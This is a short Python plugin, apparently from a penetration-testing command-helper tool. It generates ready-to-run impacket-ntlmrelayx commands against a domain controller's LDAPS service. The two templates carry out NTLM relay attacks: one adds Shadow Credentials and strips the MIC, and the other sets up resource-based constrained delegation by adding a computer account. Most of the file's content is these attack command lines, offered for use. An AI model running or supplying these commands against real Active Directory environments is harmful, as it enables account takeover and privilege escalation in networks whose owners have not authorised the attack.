from command.Command import Command
from Util import getarg, isNtHash

class CommandImpacketNtlmrelayx(Command):
    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
        super().__init__(name, config, tags)
        conf = config['ADDefaults']
        self.defaultDcIp = conf['dcIp']

    def matchesTrigger(self, trigger : str) -> bool:
        triggerLower = trigger.lower()
        triggers = ['impacket-ntlmrelayx', 'ntlmrelayx']
        return any(word in triggerLower for word in triggers)

    def getHelp(self) -> str:
        return "return impacket-ntlmrelayx <args>"

    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
        dcip = getarg(args, 0) or self.defaultDcIp

        cmds = []
        helptext = ["overwrite defaults with impacket-ntlmrelayx <dcip>\n"] if len(args) == 0 else []
        cmds.append('# Shadow Credentials')

        c = "impacket-ntlmrelayx"
        cmds.append(f"{c} -t ldaps://{dcip} --remove-mic --smb2support --no-dump --shadow-credentials --shadow-target '<computer-name>'")

        cmds.append("\n# RBCD")
        cmds.append(f"{c} -t ldaps://{dcip} --remove-mic --smb2support --no-dump --delegate-access --add-computer '<computer-name>'")
        return helptext + cmds
